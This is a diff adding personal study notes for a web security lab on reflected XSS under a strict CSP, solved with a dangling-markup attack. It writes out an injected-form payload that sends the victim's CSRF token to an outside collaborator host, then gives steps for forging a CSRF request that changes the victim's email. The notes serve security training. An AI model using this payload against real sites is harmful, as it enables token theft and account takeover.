@@ -83,3 +83,17 @@ TIP:-         Test every entry point.
      1. Used arrow to implement throw statement then used the payload given in lab
 
 --------------------------------------------------------------------------------------------
+
+#10 Lab: Reflected XSS protected by very strict CSP, with dangling markup attack
+
+     1. In url add &email=<script>alert(1)</script> 
+     2. Inspect the page and we'll see that payload is reflected without any sanitation
+     3. Make value=""><form> instead of keeping script tag in it
+     4. Paste the payload given below in url 
+         "></form><form class="login-form" name="evil-form" action="https://8bkyukl51qzexso3v2k54v9s7jda11pq.oastify.com/token" method="GET"><button class="button" type="submit">Click Me</button></form>
+     5.Change email manually and capture the request in burp and in url remove id=wiener
+     6. Send the payload in point 4 to exploit server under script tag
+     7. Once you receive the csrf token of target then in repeater generate csrf poc and send to exploit server
+     8. In exploit server change csrf token to with victim's and email to given in lab question and lab is solved.
+
+----------------------------------------------------------------------------------------------------------
